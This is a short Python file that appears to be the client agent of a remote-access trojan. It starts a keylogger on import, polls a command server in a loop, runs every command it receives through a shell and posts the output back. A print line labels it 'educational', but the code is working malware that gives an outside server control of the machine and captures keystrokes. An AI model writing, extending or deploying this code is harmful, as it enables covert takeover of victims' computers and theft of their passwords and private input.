import time
import requests
import subprocess
from shared.config import SERVER_URL, AGENT_ID
from client import keylogger

keylogger.start_keylogger()

def get_command():
    try:
        response = requests.get(f"{SERVER_URL}/get-command/{AGENT_ID}")
        return response.json().get("command", "")
    except Exception as e:
        print(f"[ERROR] {e}")
        return ""

def send_result(result):
    try:
        payload = {"result": result}
        requests.post(f"{SERVER_URL}/send-result/{AGENT_ID}", json=payload)
    except Exception as e:
        print(f"[ERROR] {e}")

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()
    except Exception as e:
        return str(e)

def run_agent():
    print("[*] Iniciando agente educacional...")
    while True:
        command = get_command()
        if command:
            print(f"[>] Executando comando: {command}")
            result = execute_command(command)
            send_result(result)
        time.sleep(5)

if __name__ == "__main__":
    run_agent()
